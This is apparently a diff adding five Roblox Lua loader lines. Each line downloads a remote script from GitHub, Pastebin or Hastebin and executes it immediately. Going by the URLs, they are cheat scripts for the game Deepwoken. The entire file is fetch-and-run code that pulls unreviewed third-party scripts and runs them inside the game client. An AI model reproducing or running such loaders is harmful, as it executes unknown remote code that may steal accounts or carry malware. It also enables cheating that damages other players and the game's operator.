@@ -1,0 +1,5 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Mstir16/legocheats/main/archive/Deepwoken/CharismaAutoPaster.lua"))();
+loadstring(game:HttpGet("https://pastebin.com/raw/w8qQ07Pm", true))();
+loadstring(game:HttpGet("https://raw.githubusercontent.com/slightten/scripts/main/deepwoken%20dev"))();
+loadstring(game:HttpGet("https://www.toptal.com/developers/hastebin/raw/ijipemitaw.md", true))();
+loadstring(game:HttpGet(("https://raw.githubusercontent.com/BillsTheGod/V3RMILLION_PROJECTS/main/Deepwoken.lua")))();
